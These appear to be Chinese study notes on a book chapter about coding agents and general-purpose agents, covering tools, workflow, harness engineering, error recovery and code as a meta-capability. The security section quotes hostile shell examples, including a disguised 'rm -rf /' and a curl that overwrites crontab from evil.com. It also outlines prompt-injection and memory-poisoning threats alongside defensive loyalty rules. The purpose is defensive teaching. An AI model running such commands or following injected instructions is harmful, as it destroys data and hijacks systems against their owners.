# 05 · Coding Agent 与通用 Agent

> 来源：《深入理解 AI Agent》第 5 章
> 核心命题：**以开放任务为目标的通用 Agent，核心 = Coding Agent + 文件系统**。代码生成是一种"元能力"——能动态创造新工具和新能力。

---

## 5.1 Coding Agent

### 5.1.1 Coding 是 Agent 的基础能力

**七个核心工具**（极简但完整）：
1. **Code Interpreter**（代码解释器）：隔离沙盒安全执行 Python。
2. **Bash Shell**（命令行）：执行命令、跑测试、处理特殊格式文件。
3. **读文件工具**：读代码、配置、文档、日志。
4. **写文件工具**：创建/完全重写文件。
5. **编辑文件工具**：局部修改（代码维护迭代核心）。
6. **搜索文件名工具（Glob）**：模式匹配定位文件（`**/*.py`）。
7. **搜索文件内容工具（Grep）**：搜索文本模式。

> 七个工具主要覆盖感知和执行两类；协作/事件触发/用户沟通需其他工具，但不是 Coding Agent 核心。
> 代码生成是"通用的问题解决手段"：数学推理写代码求解、固化业务规则、缺工具临时写、数据格式变动态生成解析。

### 5.1.2 通用 Agent 的 Coding 内核（Manus → OpenClaw）

- 为什么 Coding 是核心（而非 Deep Research / Computer Use）？因为几乎所有高效内容生成最终都落到代码上：PPT/Word 本质是 OOXML 代码，PDF 可经 Markdown/HTML/LaTeX 生成，数据分析可视化用 Python，GUI 操作序列可固化为代码。
- **代码生成是效率最高、成本最低、可复用性最强的能力基座**。
- **文件系统是 Agent 的信息流转枢纽**：记忆从文件读、产物写入文件、经验保存为文件。Markdown 而非向量数据库（用户可直接阅读修改、保留时间顺序避免语义检索时间混淆、Git 版本控制回滚）。
- 文件系统组织：MEMORY.md（高层级事实/偏好）、daily/日期.md（按日归档）、SOUL.md（身份与行为规则）、知识库文件、Git 版本控制。
- **适用边界**：开放任务型通用 Agent 以 Coding 为核心架构；垂直领域客服 Agent 任务空间封闭，代码只是工具箱里一件工具（但仍重要：精确计算、数据处理、规则校验）。

### 5.1.3 Coding Agent 整体流程（五阶段）

1. **项目文档化**：先建立认知框架再动手。关键文档缺失时主动文档化。**项目指令文件**（CLAUDE.md、AGENTS.md、.cursorrules）是业界事实标准——每次会话自动注入，相当于项目级系统提示词（构建/测试命令、代码风格、禁区）。从上下文工程看是最经济的稳定前缀（KV Cache 友好）。**评估团队"AI-ready"的简单指标：一个远程新人只靠代码仓库和文档能否独立开展工作。**
2. **需求理解与澄清**：简单需求（已知 bug、调参数）直接实现；复杂需求（需求模糊、实现路径多样、影响面广）通过探索性调研澄清边界，主动与用户对话（"优化性能"需先搞清目标、权衡、瓶颈）。
3. **编写设计文档**：回答改哪些模块及原因、方案及优势、新依赖、预期影响；为人类提供高效介入点（审查设计文档比审数百行代码容易）。
4. **代码实现与测试**：遵循规范，复用抽象，适度重构；写测试覆盖正常/边界/异常；测试失败分析原因修改代码直到通过。**把"测试通过"而非"代码写完"定义为完成标准**（Loop 工程"由验证判定何时可以停"）。
5. **审查与交付**：自我批判审视（可读性、性能、安全、风格）；涉及架构变化更新文档（过时文档比没有更糟）。

> 现实 Agent 会按需裁剪流程（简单 bug 跳过设计文档）。"何时停止收集信息开始行动"的阈值首先是**模型学到的行为策略**，Harness 提示词/工具/预算能放大或抑制但不是来源。

### 5.1.4 Harness 工程在 Coding Agent 中的实践

**四个工程组件**：
- **验收基线**（什么算做完）：测试套件、CI 管道、代码审查标准。
- **执行边界**（能碰什么）：模块边界、依赖规则、权限控制。
- **反馈信号**（自动对错判断）：Linter 输出、测试结果、类型检查错误。
- **回退手段**（怎么恢复）：Git 版本控制、沙盒隔离、快照回滚。

**任务清晰度 × 验证自动化四象限**：
| | 结果可自动验证 | 结果需人工验证 |
|--|--------------|--------------|
| **目标明确** | 最佳区域（修复有测试用例的 bug） | 吞吐量受限（重构需人工审查） |
| **目标模糊** | 高效地跑偏（用 linter 优化"代码质量"） | 难以启动（"让 UI 更好看"） |

> Harness 目标：把尽可能多任务推向"目标明确 + 验证自动化"象限。代码编写天然在此象限核心。

**通用 Harness 设计原则（可迁移）**：
1. **约束优先于指导**：能用代码强制就不要用文档建议（Linter/类型/CI 是"做不了"，提示词是"建议别做"）。
2. **验证要自动化**：人工审查是不可扩展瓶颈。
3. **反馈越快越好、越结构化越好**：错误信息越详细越接近错误时刻，纠正效率越高。
4. **回退要可靠**：安全网内操作才敢试错（Git 分支、沙盒、快照）。

**约束另一层目的（防过程性错误）**：验收基线管结果对不对，执行边界管过程——结果正确但用错误方法也不行（删库重建、全删重写）。这是 reward hacking 的日常形态；生产级 Harness 对危险动作设专门检查审批（约束的是动作而非结果）。RLVP（验证路径惩罚）从训练侧解决同一问题。

**工具编排：故障边界控制**：故障只在同一批并行调用内传播，不上升到父级操作（读三文件一失败只报一个，不取消其他、不中止任务）。

### 5.1.5 故障与错误恢复（核心工程能力）

**四层故障分类**：
1. **API 层**：限流（429）、过载、超时、连接中断、输出触顶截断（与任务内容无关的基础设施噪声）。
2. **工具层**：幻觉调用、参数畸形、执行抛异常、工具反复返回同一错误而模型不加改变反复重试。
3. **上下文层**：窗口溢出、压缩失败、轨迹结构损坏（工具调用缺配对结果消息）。
4. **控制流层**：死循环（反复执行相同操作无进展）与死亡螺旋（错误恢复逻辑又调 LLM 再出错连锁）。

**检测：先分类，再计数**：
- 捕获故障后第一个判断不是"要不要重试"，而是"值不值得重试"。可重试（限流、过载、网络抖动）重试才有意义；不可重试（参数不合法、权限不足、工具不存在）必须改变输入或策略。**生产级 Harness 维护错误到恢复策略的映射表**。
- **重复调用指纹**：对"工具名+参数"计算指纹，相同指纹反复出现 = 无进展循环信号。
- **连续失败计数**：每条恢复路径独立计数器，为熔断提供依据。
- **活性监控**：流式连接最危险是静默卡死（连接成功但数据流停止），SDK 超时只覆盖初始连接不覆盖传输过程 → 需独立空闲看门狗（watchdog timer）。**每个长连接都需要活性信号**。
- **完整性监控**：发现工具调用缺配对结果消息时，注入前自动修复配对关系。**"产品模式宽容、训练模式严格"**（训练模式拒绝修复，因合成占位符污染训练数据）。

**恢复：分级升级，逐级透明**：
1. **静默重试**（可重试错误默认动作）：指数退避 + 随机抖动（避免同步重试二次拥塞）；区分前台/后台调用（后台辅助调用失败直接放弃，避免"重试放大"）。
2. **降级与接续**：输出触顶→先提升上限重发→仍不够末尾追加元指令从断点接续；主模型过载→降级备用模型（先剥离旧模型私有格式块）；高成本模式限流→回落标准模式。
3. **暴露给用户**：所有自动手段用尽后才呈现错误，附上已尝试的恢复动作。

- 工具层错误走另一条路：**不终止会话，把错误变成模型输入**（幻觉调用收到"工具不存在"结构化错误、参数校验失败收到输入约束提示）。喂回的错误越具体，模型自我纠正成功率越高。
- **核心原则**：错误处理边界不是单次请求，而是整个恢复循环；确认无法恢复前不暴露中间态（恢复期间扣留错误，成功后消费者无感知）。

**终止：每条恢复路径都要有上限**：
- 熔断阈值来自**生产数据而非拍脑袋**（Claude Code 压缩熔断"连续 3 次"来自真实统计——曾有会话连续失败三千余次，每天全球约 25 万次无效 API 调用）。
- **死亡螺旋防护**：错误路径上禁用一切会再次调用模型的副作用逻辑 + 递归深度计数器检测打断连锁。
- 全局终止与升级条件：最大迭代轮数、会话预算上限、连续失败超阈值升级人工。

### 5.1.6 Coding Agent 实现技巧（五个）

1. **并行工具调用、流式执行与级联中止**：第一个工具调用参数完整生成并通过校验即可立即执行，与后续调用生成重叠；独立调用并行执行。每个工具声明是否支持并发（默认否，失败安全）；调用失败通过级联中止终止同批依赖该结果的调用，不波及独立调用和父级。
2. **上下文精细化管理**：大文件按行号范围读取；返回内容附加行号标注（模型可精确引用"src/main.py 第 42 行"）。终端长输出用头尾截断 + 持久化。
3. **环境信息动态注入**（Agent 状态栏）：每次推理前在上下文末尾注入当前工作目录、git 分支、最近提交、未暂存/已暂存变更概览——作为动态追加式状态栏实时生成（不硬编码进静态提示词，避免破坏 KV Cache）。
4. **命令执行环境状态持久化**：维护持久化终端会话（保留工作目录、环境变量、会话状态），符合人类开发者习惯；保留启动隔离终端能力支持并行。
5. **即时语法反馈**：文件写入完成工具层自动运行 linter，结果作为工具返回值一部分；像 IDE 实时画红线。

### 5.1.7 搜索工具（四类互补）

| 工具 | 查询 | 特点 |
|------|------|------|
| **正则内容匹配（grep/ripgrep）** | `rg "def handle_.*"` | 精确文本找所有位置，支持文件类型/路径过滤；无法理解语义 |
| **文件名匹配（glob）** | `**/test_*.py` | 不看内容，路径模式定位，探索项目结构第一步 |
| **语义代码搜索** | "处理用户输入验证" | 结构感知分块（按函数/类切）+ 混合检索（向量+BM25+重排序）；适合探索性任务 |
| **符号定义/引用** | find_references | AST 级消除同名歧义；主流 coding agent 未采用 |

- **路线之争**：Claude Code 刻意不建嵌入索引，纯靠 agentic 的 grep + glob 现场检索（避免维护陈旧索引和整套基础设施）；Cursor 早期走嵌入索引路线，现也改用 grep + glob。
- 实践组合："从粗到细、从语义到语法"渐进式策略（语义找模块→正则定位行→符号追调用链）。

### 5.1.8 文件编辑工具（五种方案）

| 方案 | 优势 | 劣势 | 采用 |
|------|------|------|------|
| Diff + Apply Model | 关注点分离 | 微小偏差致错位 | Cursor（近期弃用） |
| **Old String → New String** | 可预测、无歧义 | 大段删除需全输出 | Claude Code、Codex、Cursor |
| 行号定位 | 大段操作高效 | 长文件行号易错 | IDE 深度集成 |
| 类 Vim 命令 | 移动/重组高效 | 弱模型出错多 | 实验性 |
| 首尾匹配 | 大段删除免全输出 | 需边界组合唯一 | 部分定制 |

- Old→New：old string 存在且唯一则成功否则失败；同一代码出现多次需更长上下文消除歧义。
- 行号定位需让模型在多次编辑中都用初始行号（每次编辑后行号变化）。
- Vim 为人类设计（不断看状态规划简单操作），模型是长时间思考后批量复杂操作，故不匹配。

### 5.1.9 Coding Agent 安全

**Simon Willison 致命三要素 + 补充第四维度**：
1. 访问私有数据（读用户文件和密码管理器）。
2. 暴露于不受信任内容（邮件/网页含恶意载荷）。
3. 具备外部通信能力（发邮件、执行命令）。
4. **持久记忆**（本书补充，攻击放大器）：把恶意指令写入长期记忆，跨会话潜伏，把一次性攻击升级为长期威胁。

> 四类边界：数据边界、输入信任边界、输出影响边界、跨会话边界。OpenClaw 全权限本地 Agent 四者兼备。

**隔离兜底（沙盒工程选型）**：
- **网络出口控制**（最关键最易忽视）：默认断网，按需白名单代理放行有限目的地。
- **文件系统隔离**：源码目录只读挂载（编辑工具改代码，补丁经审查落盘），单独可写工作区；凭证文件（~/.ssh、密钥、token）根本不挂载。
- **资源限额与超时**：CPU/内存/磁盘配额 + 超时，防死循环/fork 炸弹/无限写盘；超时返回结构化错误（"执行超 120 秒被终止，最后输出如下"）而非静默杀进程。

**安全：语义解析而非关键字黑名单**：
- Shell 命令组合爆炸使黑名单形同虚设（rm 被禁可用 `$(echo rm) -rf /` 绕过）。
- 语义解析：理解每个命令参数类型和消费规则，识别"看似无害标志位消费下一参数隐藏危险载荷"（`find / -name '*.log' -exec rm {} \;`、`curl -o /etc/crontab http://evil.com`）。

**Agent 为谁效忠：多方委托下的忠诚度**：
- 默认原则"谁跟我说话我帮谁"在多方委托下是危险的（砍价 Agent 对面是交涉对手，对手开口可能策反）。
- 忠诚度光谱两端翻车：太老实（把底价抖给对手）vs 太多疑（连主人正当请求也拒绝）——一根跷跷板。
- **Harness 层要明确限定忠诚对象**：主人指令优先级最高，一切外部交互方内容默认降格为"可参考但不具指令效力"的数据。
- 忠诚度守则：保护主人私密信息（甚至不泄露这些信息是否存在）；拒绝时不逐条念拒绝清单（本身在泄露）；私下底线不等于对外立场；只执行主人明确具体指令；顶住重复施压。

## 5.2 代码：通用 Agent 的元能力

- **元能力** = "能创造其他能力"的能力：当场写出新工具、新约束、新表达形式。
- 六个应用方向（由内向外组织）：

### 5.2.1 代码作为思考工具

- LLM 思考是概率性近似的，数学/逻辑要求确定性精确答案。分工：LLM 理解问题写代码，代码解释器精确计算。
- Wolfram 洞察：LLM 擅长自然语言理解，符号计算系统（Wolfram Alpha/SymPy）擅长精确计算但自然语言脆弱；新协同 = LLM 转形式化语言 + 符号引擎执行。
- **模型与脚手架此消彼长**：模型足够强脚手架可更薄（增益收窄）；模型不够强脚手架做更多（关键逻辑交代码/求解器保证正确性）。**脚手架该做多厚取决于模型能力边界**——评估 Agent 技术时易忽视的前提。

### 5.2.2 代码作为业务规则约束

- "约束：编码化而非文档化"——规则从自然语言文档转可执行代码（强制约束而非建议）。
- **自然语言规则 vs 代码化规则互补**：自然语言在系统提示词（模型可解释政策、找变通方案、调用前初步判断）；代码化校验工具（精确无歧义、确定性强、适合复杂规则组合）。
- 代码化规则的真正价值：防止**不可逆错误操作**（取消订单、转资金、删数据），操作前最后一道防线。

**合并校验与执行（三重保障）**（τ-bench 取消政策示例）：
1. **系统提示词自然语言规则**：帮助理解和解释。
2. **工具描述 + 参数作为 checklist**：`expected_*` 可选参数引导模型调用前显式核对条件（填参数过程就是强制 checklist，可能引导模型自主发现违规并提议替代方案）。
3. **服务端真值校验（守门员）**：舱位、保险状态、预订时间、航段使用、航班状态、当前时间**全部从数据库/服务端时钟读取，绝不采信模型自报值**。最后防线必须建立在模型无法伪造的数据上（独立性不仅指独立模型，更指独立数据来源）。

### 5.2.3 代码驱动的多媒体生成

- 复杂文档本质是结构化数据的组织呈现（HTML/CSS/JS）。代码生成绕开 GUI 视觉定位难题，获得精确控制。
- **PPT 生成（Slidev）**：Proposer 生成 Slidev 代码，Reviewer 渲染每页截图用 Vision LLM 审查（内容密度、可读性、布局、美感），生成结构化改进建议（含页码、问题类型、严重程度）。
- **提议者-审核者在此的目标**：内容质量迭代改进（多轮循环，Reviewer 接触 Proposer 看不到的新信息——渲染结果），区别于第四章的不可逆操作安全审查（单次批准/否决）。
- **双 Agent 分工核心优势**：上下文管理——Reviewer 每次只看最新渲染图，Proposer 只累积结构化反馈；单 Agent 需在同一上下文累积数十页截图迅速超限。
- 视频编辑（Blender API / ffmpeg）：比 GUI 操作更易（API 结构化可组合）；两步定位（粗粒度每 10 秒截图 + 细粒度每秒截图）；视频分析封装为子 Agent 避免大量截图占主上下文。

### 5.2.4 代码作为系统适配器

- 外部服务无 SDK、接口不规范、字段随版本漂移 → Agent 当场读文档/观察真实响应，即时生成适配代码（构造 HTTP 客户端、拼装鉴权头、解析非标准结构）。
- **万能胶**：延伸到无 API 系统——先 Computer Use 操作界面，再把成功操作序列固化为 RPA 工具（第九章）。
- **日志自适应解析**：前端遇无法解析格式时，自动把失败信息报告 Agent，Agent 分析样本生成解析代码，虚拟浏览器自动测试（Vision LLM 查可视化），通过后热更新部署——"自动修复的反馈循环"。
- **生产日志智能诊断**：读轨迹 → 结合架构文档/PRD 分析 → 生成结构化问题报告（优先级/模块/描述/建议）→ 生成回归测试用例（引用轨迹 ID + 交互轮次，自动重放）→ MCP 对接 GitHub 创建 Issue。人工诊断从小时级降到分钟级。

### 5.2.5 代码作为生成式 UI

- **生成式 UI**：Agent 动态生成表单、交互图表甚至完整 Web 应用。
- **A2UI 类协议（声明式界面，安全优先）**：Agent 不直接生成可执行代码，只输出"界面描述清单"（JSON），客户端用预先准备好的安全组件渲染。类比：顾客只能点菜单上有的菜，不能进厨房自己做。
  - 澄清：AG-UI 是事件/传输协议（流式推送执行状态），非界面描述语言，二者互补。
  - 核心：客户端维护受信任组件目录（Card/Button/TextField/Table），Agent 只能请求渲染已有组件；跨平台、增量生成（流式 JSONL）。
- **用 HTML 交付成果（取代 Markdown）**：交互式演示、更好数据可视化、可持续完善的交付件。三个作用：实验数据追溯（逐条查看 prompt 和 LLM 原始回复）、训练指标监控（内科指标：损失、梯度范数、学习率、困惑度、奖励、KL 散度、策略熵，比最终准确率更早暴露问题）、运行原理展示。
- **澄清用户意图（动态表单）**：HTML 表单 + JavaScript 级联逻辑，一次填写替代十轮问答。
- **生成 SQL（Artifact 模式）**：Agent 只生成 SQL 代码作为 artifact，系统直接查数据库渲染表格——**数据从数据库直达用户界面，完全绕过 LLM**（LLM 只写查询不读数据，避免抄写错误/耗 token/延迟）。
  - 安全：执行层用只读账号，只允许批准 SELECT，拒绝 DDL/DML/多语句；用户值服务端参数化绑定；限制查询时间/行数/表/时间范围；可视化代码沙盒隔离运行。
- **动态生成软件**：信任边界下移到数据层（第一章三层护栏最难绕过那层）——动态应用层负责界面/流程/编排，数据层（行级安全、约束校验器、受控视图、存储过程）强制"谁能对哪条数据做什么"。每次读写携带受信任运行时绑定的 access context（用户/租户/角色/Agent 身份），生成代码只能以受限身份访问，不能伪造身份或获得高权限凭证。

### 5.2.6 代码创造代码：Agent 自举

- Agent 能用代码生成能力创造另一个 Agent。DNA 自复制（随机变异+自然选择，37 亿年盲目试错）vs Agent 自举（理解代码+定向设计，继承最佳实践）。
- **OpenClaw Doctor（自我修复）**：确定性检查（过期 token、锁文件、端口冲突，与运维脚本无本质区别）+ LLM 兜底（长尾疑难：分析日志、理解配置语义、推断因果）。两层配合。
- **让 Agent 写 Agent 的关键技巧**：**基于范例的生成**（而非从零）——复制自己或其他高质量实现，再针对性修改（调系统提示词、替换工具、改业务逻辑保留架构）。避免常见缺陷（上下文管理随意、工具设计不规范、技术选型滞后、外部生态脱节）。
- 元编程（Metaprogramming）：Meta-Agent 读参考代码 → 复制脚手架 → 定向修改 → 验证测试 → 生成新 Agent。

---

## 5.3 本章小结

- Coding Agent 成熟度高的原因**不是代码生成模型特别强，而是软件工程几十年基础设施（测试套件、类型系统、版本控制）天然构成强大 Harness**。
- Agent 可靠性不取决于模型犯不犯错，而取决于每类故障是否都有对应检测、恢复与终止路径。
- 代码的六个元能力方向：思考工具、业务规则约束、多媒体生成、系统适配器、生成式 UI、Agent 自举。
- 代码既是完成任务的手段，也是积累知识、创造工具、优化自身的机制。
